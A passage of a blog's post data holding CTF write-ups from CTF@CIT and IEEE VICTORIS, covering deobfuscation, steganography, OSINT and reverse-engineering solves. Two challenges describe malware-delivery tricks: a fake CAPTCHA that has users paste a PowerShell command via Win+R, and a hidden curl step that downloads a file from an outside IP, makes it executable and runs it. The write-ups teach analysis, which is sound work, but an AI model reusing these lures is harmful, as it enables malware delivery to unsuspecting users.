  IllllIIllIIl = llIIIIIIlIIllll.IIIlIIlIIlIl(IIIllIIlII)\n    IIIllIIlIII = llIIIIIIlIIllll.IlIIIllIlIlIlI(IllllIIllIIl)\n    IlIIIIIlIIIIlIIIIIII = (int(hashlib.sha1(IllllIIllIIl.encode()).hexdigest()[:8], 16)) &amp; 0xFFFF\n    llllllIIlIlIIIIlI = IIllIllIIIIIIlIl([llIIllIIll, llIIlIllIIllIIIIll, IIIllIIlIII, IlIIIIIlIIIIlIIIIIII])\n    return llllllIIlIlIIIIlI\ndef IIIIlIIlIll(val: str) -&gt; str:\n    lIIlIIlllIllllllIIll = 7\n    IlIlIlIIllIIIl = []\n    for c in val:\n        IlIlIlIIllIIIl.append(chr(((ord(c) - 48 + lIIlIIlllIllllllIIll) % 75) + 48))\n    return &quot;&quot;.join(IlIlIlIIllIIIl)\n</code></pre>\n<p>Now, in this code the first function executes a series of transformations on a predefined input string <code>S3cr3tS33d_For_CTFC0mp</code> and returns the final processed result, then the second one shifts each character in its input by +7, modulo 75, inside a printable range, It&#39;s a simple obfuscation or encoding technique.</p>\n<p>now we can rewrite it like that:</p>\n<pre><code class=\"language-py\">def function_4() -&gt; str:\n    input_str = &quot;S3cr3tS33d_For_CTFC0mp&quot;\n    initial_seed  = generate_seed(input_str)\n    transformed_seed  = recursive_transform(initial_seed , iterations =10)\n    transformer  = Transformer(transformed_seed )\n    step1 = transformer.transform_step1()\n    base64_encoded = transformer.transform_base64_encoded(step1)\n    step3 = transformer.transform_step3(base64_encoded)\n    partial_hash  = (int(hashlib.sha1(base64_encoded.encode()).hexdigest()[:8], 16)) &amp; 0xFFFF\n    final_result  = generate_final_token([initial_seed , transformed_seed , step3, partial_hash ])\n    return final_result \ndef function_5(val: str) -&gt; str:\n    key = 7\n    str2 = []\n    for c in val:\n        str2.append(chr(((ord(c) - 48 + key) % 75) + 48))\n    return &quot;&quot;.join(str2)\n</code></pre>\n<p>The next one is the main function, which looked like that after simplify its math and characters calculation :</p>\n<pre><code class=\"language-py\">def IllIlllIIllIlIIIIIlI():\n    IllIlllIIlll = lIllIlIIlIlllllIllll()\n    lllIIIllIllII = IIIIlIIlIll(IllIlllIIlll)\n    llIlIIIIIlllIIll = &quot;&quot;.join(&quot;CIT{&quot;)\n    IllIIIllllIlII =&quot;&quot;.join(&quot;}&quot;)\n    lIIlllllIl = llIlIIIIIlllIIll + lllIIIllIllII + IllIIIllllIlII\nif __name__ == &quot;__main__&quot;:\n    IllIlllIIllIlIIIIIlI()\n</code></pre>\n<p>which can be cleaned to:</p>\n<pre><code class=\"language-py\">def main():\n    var1 = function_4()\n    var2 = function_5(var1)\n    var3 = &quot;CIT{&quot;\n    var4 = &quot;&quot;.join(&quot;}&quot;)\n    var5 = var3 + var2 + var4\nif __name__ == &quot;__main__&quot;:\n    main()\n</code></pre>\n<p>Now that we have a clear deobfuscated code that we understand how it works, we can run it and even edit it.</p>\n<p>When we run the code, nothing happends, that is because the concatenated string <code>CIT{</code> + <code>Encoded string</code> + <code>}</code> which is made in the main didn&#39;t get printed, so adding this print line at the end of the main will result in printing the flag:</p>\n<pre><code class=\"language-py\">print(var5)\n</code></pre>\n<p>Flag: <span style=\"color:#00FFFF;\"><strong>CIT{7777aKMpU9X3TqnD}</strong></span></p>\n<hr>\n<hr>\n<p align=\"center\"><span style=\"color:#00FFFF;\">THE END</span></p>\n\n\n<hr>\n<hr>\n"
  },
  {
    "id": "/post/ctfcit",
    "slug": "ctfcit",
    "title": "CTF@CIT!",
    "description": "Write-up for 5 MISC, 2 Stegano and 2 OSINT challenges from  the annual World-Wide CTF@CIT.",
    "date": "April 30, 2025",
    "readTime": "9 min read",
    "tags": [
      "CTF"
    ],
    "category": "CTF Writeups",
    "imageUrl": "/assets/images/Write-Ups/CTF@CIT2025/team.png",
    "content": "<h1><strong>CTF@CIT!</strong></h1>\n<p>Hello Everyone!<br>\nI recently participated in the CTF@CIT, which was a really fun experience, and I managed to secure the 18th place with my team <code>L0ck8y7e</code> among other 950 teams around the world, As for me, I solved 11 challenges distributed among <code>MISC</code>, <code>Steganography</code>, <code>OSINT</code> and <code>Reverse</code>.</p>\n<p>In this Write-up, I&#39;ll cover all of them except the two rev challenges, which I&#39;ll discuss in a separate write-up.</p>\n<p><img src=\"/assets/images/Write-Ups/CTF@CIT2025/team.png\" alt=\"Team_rank\"></p>\n<h1><strong>MISC</strong></h1>\n<h2>Robots</h2>\n<p><img src=\"/assets/images/Write-Ups/CTF@CIT2025/Robots_image.png\" alt=\"Robots_image\"></p>\n<p>At first, I went to discord ofcourse and searched for by the chall name but just found everyone&#39;s mocking messages that say <code>Beep boop</code> [it was a misleading distraction], so I went back to the chall&#39;s description and noticed the chall name.\nIt&#39;s very similar to the famous robots.txt file</p>\n<p>Robots.txt is a simple text file placed at the root of a website (e.g., <a href=\"https://example.com/robots.txt\">https://example.com/robots.txt</a>) that tells web crawlers (like Googlebot or Bingbot) which pages or directories of the site they are allowed or disallowed to crawl.</p>\n<p>So, why don&#39;t try it on our server (<a href=\"https://ctf.cyber-cit.club/robots.txt\">https://ctf.cyber-cit.club/robots.txt</a>), and <strong>Voilà</strong>, we get this file content:</p>\n<pre><code class=\"language-js\"># robots.txt generated on 2023-10-01\n# This file instructs web crawlers on which directories they should avoid.\n# Unauthorized crawling of sensitive directories is discouraged.\n# Please adhere to the policies specified below.\n\n### Global directives for all crawlers\nUser-agent: *\nCrawl-delay: 10\nDisallow: /cgi-bin/\nDisallow: /tmp/\nDisallow: /junk/\nDisallow: /cache/\nDisallow: /logs/\nDisallow: /backups/\n\n### Sensitive directories for administrative access\nDisallow: /admin/\nDisallow: /admin-panel/\nDisallow: /secret/\nDisallow: /private/\nDisallow: /config/\nDisallow: /settings/\nDisallow: /system/\nDisallow: /core/\n\n### Dynamic content and testing endpoints\nDisallow: /dev/\nDisallow: /test/\nDisallow: /sandbox/\nDisallow: /experimental/\nDisallow: /staging/\nDisallow: /beta/\nDisallow: /preview/\nDisallow: /tmp_test/\n\n### Plugin and library folders\nDisallow: /wp-admin/\nDisallow: /wp-includes/\nDisallow: /plugins/\nDisallow: /themes/\nDisallow: /modules/\nDisallow: /extensions/\nDisallow: /vendor/\nDisallow: /assets/\n\n### API and data endpoints\nDisallow: /api/\nDisallow: /data/\nDisallow: /export/\nDisallow: /download/\nDisallow: /import/\nDisallow: /json/\nDisallow: /xml/\nDisallow: /csv/\nDisallow: /alpha/\nDisallow: /bravo/\nDisallow: /charlie/\nDisallow: /delta/\nDisallow: /echo/\nDisallow: /foxtrot/\nDisallow: /golf/\nDisallow: /hotel/\nDisallow: /india/\nDisallow: /juliet/\nDisallow: /kilo/\nDisallow: /lima/\nDisallow: /mike/\nDisallow: /november/\nDisallow: /oscar/\nDisallow: /papa/\nDisallow: /quebec/\nDisallow: /romeo/\nDisallow: /sierra/\nDisallow: /tango/\nDisallow: /uniform/\nDisallow: /victor/\nDisallow: /whiskey/\nDisallow: /xray/\nDisallow: /yankee/\nDisallow: /zulu/\nDisallow: /archive/\nDisallow: /deprecated/\nDisallow: /old_backup/\nDisallow: /historic/\nDisallow: /unused/\nDisallow: /redundant/\nDisallow: /experimental_deploy/\nDisallow: /CIT{m6F2nr8RgjYI}/\nDisallow: /beta_testing/\nDisallow: /temp_storage/\nDisallow: /offline/\nDisallow: /info/\nDisallow: /hidden-files/\nDisallow: /restricted/\nDisallow: /confidential/\nDisallow: /sensitive_data/\nDisallow: /internal/\nDisallow: /miscellaneous/\nDisallow: /obscure_logs/\nDisallow: /shadow/\nDisallow: /vault/\nDisallow: /zone1/\nDisallow: /zone2/\nDisallow: /zone3/\nDisallow: /lockdown/\nDisallow: /noentry/\nDisallow: /do_not_index/\nDisallow: /blocked/\nDisallow: /deny_all/\nDisallow: /no_crawl/\nDisallow: /no_access/\nDisallow: /alpha-extra/\nDisallow: /beta-secure/\nDisallow: /gamma/\nDisallow: /delta-secure/\nDisallow: /epsilon/\nDisallow: /file_storage/\nDisallow: /media_temp/\nDisallow: /reserve/\nDisallow: /auxiliary/\nDisallow: /helper/\nDisallow: /content_backup/\nDisallow: /structure/\nDisallow: /undocumented/\nDisallow: /system_logs/\nDisallow: /error_logs/\nDisallow: /access_logs/\nDisallow: /data_archive/\nDisallow: /old_versions/\nDisallow: /legacy/\n\n### Sitemap and additional instructions\nSitemap: https://cyber-cit.club/sitemap_index.xml\nSitemap: https://cyber-cit.club/sitemap_news.xml\nSitemap: https://cyber-cit.club/sitemap_images.xml\n\n# For any issues regarding our crawling policies, please contact admin@cyber-cit.club.\n</code></pre>\n<p>Which includes our flag: \n<span style=\"color:#00FFFF;\"><strong>CIT{m6F2nr8RgjYI}</strong></span></p>\n<hr>\n<h2>Extremely Hard Challenge</h2>\n<p><img src=\"/assets/images/Write-Ups/CTF@CIT2025/Extremely_Hard_Challenge_image.png\" alt=\"Extremely_Hard_Challenge_image\"></p>\n<p>Don&#39;t be fooled by its name, it&#39;s literally telling you the flag.\n<em><strong>Sarcastic, right! (&gt; &lt;)</strong></em></p>\n<p><span style=\"color:#00FFFF;\"><strong>CIT{very_secure}</strong></span></p>\n<hr>\n<h2>Calculator</h2>\n<p><img src=\"/assets/images/Write-Ups/CTF@CIT2025/Calculator_image.png\" alt=\"Calculator_image\"></p>\n<p>It&#39;s a <code>.lua</code> file, Lua is a lightweight, fast scripting language, i opened the file in VScode and found this:</p>\n<pre><code class=\"language-lua\">function calculate(num1,num2,operator)\n    if operator == &quot;+&quot; then\n        return num1 + num2\n    elseif operator == &quot;-&quot; then\n        return num1 - num2\n    elseif operator == &quot;*&quot; then\n        return num1 * num2\n    elseif operator == &quot;/&quot; then\n        if num2 == 0 then\n            return &quot;Error: Division by zero is not allowed.&quot;\n        else\n            return num1 / num2\n        end\n    else\n        return &quot;Error: Invalid operator.&quot;\n    end\nend\n\nio.write(&quot;Enter the first number: &quot;)\nlocal input1 = io.read()\nlocal number1 = tonumber(input1)\nif not number1 then\n    print(&quot;Invalid input. Please enter a valid number.&quot;)\n    os.exit(1)\nend\n\nio.write(&quot;Enter an operator (+, -, *, /): &quot;)\nlocal operator = io.read()\n\nio.write(&quot;Enter the second number: &quot;)\nlocal input2 = io.read()\nlocal number2 = tonumber(input2)\nif not number2 then\n    print(&quot;Invalid input. Please enter a valid number.&quot;)\n    os.exit(1)\nend\n\nlocal result = calculate(number1, number2, operator)\n\nprint(&quot;Result: &quot; .. tostring(result))\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n           \t\t\n    \n           \t  \t\n    \n          \t \t  \n    \n                      \t\t\n    \n              \t   \n    \n               \t\t \n    \n                  \t  \n    \n               \t  \n    \n                \t \n    \n          \t \t  \n    \n                  \n    \n               \t  \n    \n                 \t\n    \n               \t \t\n    \n           \t\t  \n    \n                \t \n    \n                          \t\n    \n  \n\n\n\n\n-- nope no flag here, keep looking :P\n</code></pre>\n<p>It&#39;s a typical simple calculator, that takes two numbers and an operation and prints the result, but something is odd, there are some unnecessary tabs and spaces at the end followed by a comment.</p>\n<p>So, I opened it in an hex editor and found this:</p>\n<p><img src=\"/assets/images/Write-Ups/CTF@CIT2025/Calculator_hex_view.png\" alt=\"Calculator_hex_view\"></p>\n<p>It&#39;s a combimation of <code>0x0A</code>, <code>0x09</code> and <code>0x20</code>, so I opened <a href=\"https://cyberchef.org/#recipe=Find_/_Replace(%7B'option':'Regex','string':'0A090A20202'%7D,'%20',true,false,true,false)Find_/_Replace(%7B'option':'Regex','string':'20'%7D,'0',true,false,true,false)Find_/_Replace(%7B'option':'Regex','string':'09'%7D,'1',true,false,true,false)Find_/_Replace(%7B'option':'Regex','string':'%2000'%7D,'%20',true,false,true,false)From_Binary('Space',8)&input=MjAwOTIwMjAyMDIwMDkwOTBBMDkwQTIwMjAyMDIwMjAwOTIwMjAwOTIwMjAwOTBBMDkwQTIwMjAyMDIwMjAwOTIwMDkyMDA5MjAyMDBBMDkwQTIwMjAyMDIwMjAwOTA5MDkwOTIwMDkwOTBBMDkwQTIwMjAyMDIwMjAwOTA5MjAwOTIwMjAyMDBBMDkwQTIwMjAyMDIwMjAwOTA5MjAyMDA5MDkyMDBBMDkwQTIwMjAyMDIwMjAwOTA5MDkyMDA5MjAyMDBBMDkwQTIwMjAyMDIwMjAyMDA5MDkyMDA5MjAyMDBBMDkwQTIwMjAyMDIwMjAwOTA5MjAyMDIwMDkyMDBBMDkwQTIwMjAyMDIwMjAwOTIwMDkyMDA5MjAyMDBBMDkwQTIwMjAyMDIwMjAyMDA5MDkyMDIwMjAyMDBBMDkwQTIwMjAyMDIwMjAyMDA5MDkyMDA5MjAyMDBBMDkwQTIwMjAyMDIwMjAyMDA5MDkyMDIwMjAwOTBBMDkwQTIwMjAyMDIwMjAyMDA5MDkyMDA5MjAwOTBBMDkwQTIwMjAyMDIwMjAwOTIwMjAwOTA5MjAyMDBBMDkwQTIwMjAyMDIwMjAwOTA5MjAyMDIwMDkyMDBBMDkwQTIwMjAyMDIwMjAwOTA5MDkwOTA5MjAw\">Cyberchef and made this Recipe</a> and decoded the flag.</p>\n<p><img src=\"/assets/images/Write-Ups/CTF@CIT2025/cyberchef_result.png\" alt=\"cyberchef_result\"></p>\n<p>Flag: <span style=\"color:#00FFFF;\"><strong>CIT{hft4bT0415Lb}</strong></span></p>\n<hr>\n<h2>Select all squares that contain uhh...</h2>\n<p><img src=\"/assets/images/Write-Ups/CTF@CIT2025/Select_all_squares_that_contain_uhh.png\" alt=\"Select_all_squares_that_contain_uhh\"></p>\n<p>If you opened the link you will see that, it requests to click <code>WIN + R</code> and pastes the string <code>powershell.exe</code> followed by the code copied in your clipboard, so I saved the copied code into a <code>ps1</code> file and upoaded it to <code>Any.Run</code> sandbox.</p>\n<p><img src=\"/assets/images/Write-Ups/CTF@CIT2025/Capatcha.png\" alt=\"Capatcha\"></p>\n<p>After running for <code>146 s</code>, I opened this <a href=\"https://app.any.run/tasks/5cb359b6-25d3-4e0b-be5c-2e5ff45819c7\">generated report</a>, inside the dropped file section, we can see a text file named <code>flag.txt</code> which has the flag inside.</p>\n<p><img src=\"/assets/images/Write-Ups/CTF@CIT2025/dropped_file.png\" alt=\"dropped_file\"></p>\n<p>Flag: <span style=\"color:#00FFFF;\"><strong>CIT{th1s_a1nt_m4lw4r3_d0nt_w0rry}</strong></span></p>\n<hr>\n<h2>Malware Analysis</h2>\n<p><img src=\"/assets/images/Write-Ups/CTF@CIT2025/Malware_Analysis.png\" alt=\"Malware_Analysis\"></p>\n<p>This one is very straightforward, As a malware analyst, the first think I would do is to upload the sample to VT and see if it was seen before.</p>\n<p>So, I submited it and <strong>Voilà</strong>, the flag is its first submitted sample name.</p>\n<p><img src=\"/assets/images/Write-Ups/CTF@CIT2025/VT.1.png\" alt=\"VT_result\"></p>\n<p>Flag: <span style=\"color:#00FFFF;\"><strong>CIT{y6Z97OnNt79F}</strong></span>\n<em><strong>looks like some players are upset finding out the solution after the ctf is over (&gt; &lt;)</strong></em></p>\n<h1><strong>Steganography</strong></h1>\n<h2>Sorry, you&#39;re NOT a sigma!</h2>\n<p><img src=\"/assets/images/Write-Ups/CTF@CIT2025/Sorry_you're_NOT_a_sigma!.png\" alt=\"Sorry_you&#39;re_NOT_a_sigma!\"></p>\n<p>Now, we are left with a video of a lion roaring, so I extracted its sound tracks using this <a href=\"https://www.video2edit.com/extract-tracks\">tool</a>, and unsurprisingly, it has two sound tracks, one for the lion roaring and other unheard, so I downloaded the second one, converted to <code>.wav</code> then performed a <code>Spectral Analysis</code> on it, and this how it looked like.</p>\n<p><img src=\"/assets/images/Write-Ups/CTF@CIT2025/Spectral_Analysis.png\" alt=\"Spectral Analysis\"></p>\n<p>The resulted curl command is responsible for:</p>\n<ul>\n<li>Connecting to <code>http://23.179.17.40:6969/roar</code> using <code>-s</code> for silent behaviour.</li>\n<li>Download a file in the <code>/tmp/roar</code> directory.</li>\n<li>Changing the permissions of the  downloaded file allowing it to be executed</li>\n<li>Finally executing the file.</li>\n</ul>\n<p>I didn&#39;t care about all of this so I only download the file in my Windows-VM and submitted it to VT and generated this <a href=\"https://www.virustotal.com/gui/file/f1ecf94fa5790e9fef10e062edfb5e649ed2292a69bcc61e27c5186f9159a672/behavior\">report</a>, at the end of the report inside the <code>Highlighted text</code> section, we can see our precious flag.</p>\n<p><img src=\"/assets/images/Write-Ups/CTF@CIT2025/Highlighted_text.png\" alt=\"Highlighted_text\"></p>\n<p>Flag: <span style=\"color:#00FFFF;\"><strong>&quot;CIT{wh3n_th3_l10n_sp34k5_y0u_l1st3n}&quot;</strong></span></p>\n<hr>\n<h2>Queen&#39;s Gambit</h2>\n<p><img src=\"/assets/images/Write-Ups/CTF@CIT2025/Queen's_Gambit.png\" alt=\"Queen&#39;s_Gambit\"></p>\n<p>This one was very amusing, First I upload the image to this <a href=\"https://stylesuxx.github.io/steganography/\">stegano tool</a>, to extract the hidden bits in it, and I was left with this:</p>\n<p><img src=\"/assets/images/Write-Ups/CTF@CIT2025/blured_elizabeth.jpg\" alt=\"blured_elizabeth\"></p>\n<p>We now have the hidden data <code>a8 a7 a6 a5 b8 c7 b6 d5 e4 f5 g4 h5 c1 c2 c3 d2 e1 e2 e3</code>, but what does it mean?? After asking both <code>ChatGPT</code> and <code>DeepSeek</code>, I was left with nothing, all what they said was about it&#39;s very similar to the algebraic‐notation of chess-board squares, so I wrote this Python script to visualise them for me:</p>\n<pre><code class=\"language-py\">import matplotlib.pyplot as plt\n\n# Input data\ncoords = [\n    &quot;a8&quot;, &quot;a7&quot;, &quot;a6&quot;, &quot;a5&quot;,\n    &quot;b8&quot;, &quot;c7&quot;, &quot;b6&quot;,\n    &quot;d5&quot;, &quot;e4&quot;, &quot;f5&quot;, &quot;g4&quot;, &quot;h5&quot;,\n    &quot;c1&quot;, &quot;c2&quot;, &quot;c3&quot;, &quot;d2&quot;, &quot;e1&quot;, &quot;e2&quot;, &quot;e3&quot;\n]\n\n# Split into color groups\nblue = coords[:7]\nred = coords[7:12]\ngreen = coords[12:]\n\n# Convert to x, y coordinates\ndef to_xy(lst):\n    xs = [ord(c[0]) - ord(&#39;a&#39;) for c in lst]\n    ys = [8 - int(c[1]) for c in lst]\n    return xs, ys\n\nbx, by = to_xy(blue)\nrx, ry = to_xy(red)\ngx, gy = to_xy(green)\n\n# Plot\nplt.figure(figsize=(4, 4))\nplt.scatter(bx, by, s=200, marker=&#39;s&#39;, color=&#39;blue&#39;, label=&#39;P (1–7)&#39;)\nplt.scatter(rx, ry, s=200, marker=&#39;s&#39;, color=&#39;red&#39;, label=&#39;W (8–12)&#39;)\nplt.scatter(gx, gy, s=200, marker=&#39;s&#39;, color=&#39;green&#39;, label=&#39;N (13–19)&#39;)\n\nplt.xticks(range(8), list(&quot;abcdefgh&quot;))\nplt.yticks(range(8), list(&quot;87654321&quot;))\nplt.grid(True)\nplt.gca().invert_yaxis()\nplt.gca().set_aspect(1)\nplt.legend(loc=&#39;upper right&#39;)\nplt.title(&quot;Colored Grid Based on Groups&quot;)\nplt.show()\n</code></pre>\n<p>This is the final script after editing it many times to understand the meaning of the data we have, now we are left with this image:</p>\n<p><img src=\"/assets/images/Write-Ups/CTF@CIT2025/Figure_1.png\" alt=\"Figure_1\"></p>\n<p>Flag: <span style=\"color:#00FFFF;\"><strong>CIT{PWN}</strong></span></p>\n<h1><strong>OSINT</strong></h1>\n<h2>No Country for Old Keys</h2>\n<p><img src=\"/assets/images/Write-Ups/CTF@CIT2025/No_Country_for_Old_Keys.png\" alt=\"No_Country_for_Old_Keys\"></p>\n<p>As a first step, we need to know who is <code>Anthony McConnolly</code>, so I used the following google dork <code>site:XXXXX.com &quot;Anthony McConnolly&quot;</code> on several websites until I finally found a match in github, so I opened his account and he only has one repo named <code>ai-web-browser</code>:</p>\n<p><img src=\"/assets/images/Write-Ups/CTF@CIT2025/github_account.png\" alt=\"github_account\"></p>\n<p>Inside the repo, there are only 7 commits, inside the commits page, we see a commit named <code>removed my API key</code>, so we open it, and <strong>Voilà</strong>, here is our flag:</p>\n<p><img src=\"/assets/images/Write-Ups/CTF@CIT2025/commit.png\" alt=\"commit\"></p>\n<p>Flag: <span style=\"color:#00FFFF;\"><strong>ap9gt04qtxcqfin9</strong></span></p>\n<hr>\n<h2>The Domain Always Resolves Twice</h2>\n<p><img src=\"/assets/images/Write-Ups/CTF@CIT2025/The_Domain_Always_Resolves_Twice.png\" alt=\"The_Domain_Always_Resolves_Twice\"></p>\n<p>During  my last search for <code>Anthony McConnolly</code>&#39;s accounts on the social media, I have encountered his LinkedIn account, so by reviewing his posts, we can see this post where he talks about his favourite registrar</p>\n<p><img src=\"/assets/images/Write-Ups/CTF@CIT2025/LinkedIn_post.png\" alt=\"LinkedIn_post\"></p>\n<p>So, now we can go to <a href=\"https://www.whois.com/whois/ippsec.rocks\">WHOIS</a> and search on the domain named <code>ippsec.rocks</code>, and our flag is now obvious.</p>\n<p><img src=\"/assets/images/Write-Ups/CTF@CIT2025/Whois_result.png\" alt=\"Whois_result\"></p>\n<p>Flag: <span style=\"color:#00FFFF;\"><strong>GoDaddy</strong></span></p>\n<hr>\n<hr>\n<p align=\"center\"><span style=\"color:#00FFFF;\">THE END</span></p>\n\n\n<hr>\n<hr>\n"
  },
  {
    "id": "/post/ieee-victoris-30",
    "slug": "ieee-victoris-30",
    "title": "IEEE VICTORIS 3.0",
    "description": "Write-Up for 2 Reverse challenges and 2 OSINT challenges from the IEEE VICTORIS 3.0 CTF.",
    "date": "September 28, 2024",
    "readTime": "8 min read",
    "tags": [
      "CTF"
    ],
    "category": "CTF Writeups",
    "imageUrl": "/assets/images/reverse-engineering/IEEE-VICTORIS-3.0/runnnig_binary.png",
    "content": "<h1><strong>IEEE VICTORIS 3.0</strong></h1>\n<h2><strong>w3lcome</strong></h2>\n<ul>\n<li><strong>Category</strong>: Reverse</li>\n<li><strong>Difficulty</strong>: Easy</li>\n<li><strong>Link</strong>: <a href=\"https://mega.nz/file/wuUmiIBK#BREDirj3A0u9ve9HKc2Rk5CgXFe_psfPZ-FbDXoDpmg\">Here</a></li>\n</ul>\n<h3><strong>General information:</strong></h3>\n<blockquote>\n<p>Type :  EXE<br>CPU :  32-bit<br>Subsystem :  Console<br>Language: C#<br>Packing :   NO          </p>\n</blockquote>\n<h3><strong>Running the binary:</strong></h3>\n<p>First, let&#39;s run the program:</p>\n<p><img src=\"/assets/images/reverse-engineering/IEEE-VICTORIS-3.0/runnnig_binary.png\" alt=\"alt text\"></p>\n<p>So, it&#39;s a straight forward binary, we just need to find the correct password.</p>\n<h3><strong>Analysis:</strong></h3>\n<p>Now, let&#39;s open our binary in <strong>dnSpy</strong>, we see the previously printed strings. followed by a <code>Console.ReadLine()</code>, then have a length check to make sure that our input is equal to <code>15</code>, otherwise it will print <code>Sorry, wrong password!</code></p>\n<p>After that, a random number is generated using the <code>Random</code> class, and a value <code>num2</code> is computed based on the random number, password length, and the sum of the ASCII values</p>\n<p>Then creates a new byte <code>array</code> array of the same length as <code>program.secret</code>. For each byte in the <code>secret</code>, an XOR operation is performed with <code>num2</code>, and the result is stored in <code>array</code></p>\n<p><img src=\"/assets/images/reverse-engineering/IEEE-VICTORIS-3.0/Code.png\" alt=\"alt text\"></p>\n<p>Double-clicking on <code>secret</code> to see what is inside, We see that the secret field is an array of bytes, and it is used in the XOR operation in the previously code to generate the token. The array contains a predefined set of byte values, which range from 168 to 255.</p>\n<p><img src=\"/assets/images/reverse-engineering/IEEE-VICTORIS-3.0/secret.png\" alt=\"alt text\"></p>\n<p><strong>Summary</strong>:</p>\n<ul>\n<li>The program reads a 15-character password from the user.</li>\n<li>It calculates a random value based on the sum of ASCII values of the password characters and a random number.</li>\n<li>It performs an XOR operation on the secret data with this calculated value.</li>\n<li>The result is displayed as a token to the user.</li>\n</ul>\n<h3>Solution:</h3>\n<p>I wrote the following python script to loop over all possible values of num2 (from 0 to 255).</p>\n<pre><code class=\"language-py\">import string\n\n# Initialize the secret byte array\nsecret = [\n    210, 222, 222, 222, 224, 255, 171, 239, 245, 168, 239, 196, 254, 168, 225, \n    226, 196, 227, 171, 233, 196, 236, 170, 239, 243, 196, 247, 170, 246, 170, \n    239, 168, 255, 196, 240, 168, 226, 232, 235, 250, 248, 254, 230\n]\n\n# Brute-force all possible values for num2 (from 0 to 255)\nfor num2 in range(256):\n    # XOR the secret array with the current num2 value\n    decoded = &#39;&#39;.join([chr(byte ^ num2) for byte in secret])\n    \n    # Check if the decoded message contains only printable characters\n    if all(c in string.printable for c in decoded):\n        print(f&#39;num2: {num2}, Decoded message: {decoded}&#39;)\n</code></pre>\n<p><em><strong>NOTE:</strong></em> <em>The script checks if the decoded message contains only printable characters (using Python&#39;s string.printable) and prints the value of num2 along with the decoded message.</em></p>\n<p><strong>Running the script</strong></p>\n<p>After running the script, we can see our flag in the last iteration.</p>\n<p><img src=\"/assets/images/reverse-engineering/IEEE-VICTORIS-3.0/running_Xor_script.png\" alt=\"alt text\"></p>\n<h3>Flag:</h3>\n<p><span style=\"color:#00FFFF;\"><strong>IEEE{d0tn3t_e3zy_x0r_w1th_l1m1t3d_k3yspace}</strong></span></p>\n<hr>\n<hr>\n<h2><strong>bibibi</strong></h2>\n<ul>\n<li><p><strong>Category</strong>: Reverse</p>\n</li>\n<li><p><strong>Difficulty</strong>: Medium</p>\n</li>\n<li><p><strong>Link</strong>: <a href=\"https://mega.nz/file/tiEBAJgb#z9JyVrxJybRiizhinpHjRJqhRRSy2mDaeghbakjHa4o\">Here</a></p>\n</li>\n</ul>\n<p><em>First we have an <code>ELF</code> file and a <code>TXT</code> file., let&#39;s start with the ELF.</em></p>\n<h3><strong>General information:</strong></h3>\n<blockquote>\n<p>Type :  ELF<br>CPU :  64-bit<br>Subsystem :  Console<br>Language: C/C++<br>Packing :   NO          </p>\n</blockquote>\n<h3><strong>Running the binary:</strong></h3>\n<p>First, let&#39;s run the program:</p>\n<p><img src=\"/assets/images/reverse-engineering/IEEE-VICTORIS-3.0/runnnig_binary2.png\" alt=\"alt text\"></p>\n<p>The program seems to encode our input somehow and print it, the mission is to find the right input that generates the string in the <code>.txt</code> file.</p>\n<h3><strong>Analysis:</strong></h3>\n<p>At the beginning, I tried to analyze it statically with IDA, but it was way complicated, so I moved on to dynamic analysis using <code>IDA Remote Debugger</code>.</p>\n<p>First, I set a bp at where the usr is asked for input, but I ended up getting this error several times:</p>\n<blockquote>\n<p>4088FD: got SIGVTALRM signal (Virtual alarm clock) (exc.code 1a, tid 5125)</p>\n</blockquote>\n<p>After some research, I found out that this is error is generated because the binary sets a virtual timer using the <code>setitimer()</code> system call, which causes the <code>SIGVTALRM</code> signal to be delivered when the timer expires.</p>\n<p>I debugged the binary slowly until I found the call to <code>setitimer()</code> and replaced it with <code>nop</code> and fixed the return value, now we can debug the program more easily.</p>\n<p>After heavy debugging, I still don&#39;t understand how the encode is done, so I moved to a quicker way.</p>\n<p>Since we have the desired output, why can&#39;t we just brute-force it?, So, I wrote the following Python script to automate the process and tried to make it as simple as possible so that it runs quickly:</p>\n<pre><code class=\"language-py\">import itertools\nimport string\nimport subprocess\n\n# Define the binary path and the input value\nbinary_path = &#39;./Patched&#39;  \n\n# Define the desired output\ndesired_output = &quot;E&amp;M*~;,%#&lt;2N]/~J3E*?&amp;*F&lt;E!,Y%\\;;S*:\\=%8N%NORN*~?G%14WG;;+*W1*RWX^E*&#39;2*?+*U*FU\\%2|G4,X:I&gt;%I%&#39;S93W4%1O7,Z&amp;;*?NE!D$~#|]ISR**^EZW,E&gt;&quot;\n\n# Define the character set (uppercase, lowercase, digits, and underscore)\ncharset = string.ascii_uppercase + string.digits + &#39;_&#39; + &#39;+&#39;\n\n# Fixed prefix\nprefix = &#39;&#39;\n\n# Length of the remaining characters\nremaining_length = 128\n\n# Function to brute force the remaining characters\ndef brute_force():\n    for suffix in itertools.product(charset, repeat=1):\n        # Join the prefix and the current suffix to form the full input\n        input_value = prefix + &#39;&#39;.join(suffix)\n        yield input_value\n\n\nif __name__ == &quot;__main__&quot;:\n    for itration in range (remaining_length):\n        for attempt in brute_force():\n            input_value = attempt\n            try:\n                # Run the binary and provide input\n                process = subprocess.Popen(binary_path, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n\n                # Communicate with the process to send the input and capture output\n                output, error = process.communicate(input=input_value.encode())\n\n                # Print the output and any errors\n                if output:\n                    f_output = output.decode()[30:(30+len(input_value))] # Delete the string printed before the output\n                    if f_output == desired_output[:len(f_output)]:\n                        prefix = input_value\n                        break  # Move to the next iteration after finding a match\n\n\n\n                if error:\n                    print(&quot;Error:&quot;, error.decode())\n\n            except FileNotFoundError:\n                print(f&quot;Error: The binary &#39;{binary_path}&#39; was not found.&quot;)\n\n            except Exception as e:\n                print(f&quot;An error occurred: {str(e)}&quot;)\n\n\nprint(prefix)\n</code></pre>\n<h3>Running the script:</h3>\n<p>After running the script for only 10 seconds, we have got our flag.</p>\n<p><img src=\"/assets/images/reverse-engineering/IEEE-VICTORIS-3.0/running_2nd_script.png\" alt=\"alt text\"></p>\n<h3>Flag:</h3>\n<p><span style=\"color:#00FFFF;\"><strong>IEEE{IDK_MAN_THIS+FEELS_SO_EASY_I_TOLD_YOU_TO_TAKE_THE_HARDWAY_NO_TOOLS_NO_HS_DECOMPILER_ONLY_ASSEMBLY_AND_GDB_STEP+STEP+STEP_THEN_S1}</strong></span></p>\n<hr>\n<hr>\n<h2><strong>Kattaketo</strong></h2>\n<ul>\n<li><strong>Category</strong>: OSINT</li>\n<li><strong>Difficulty</strong>: 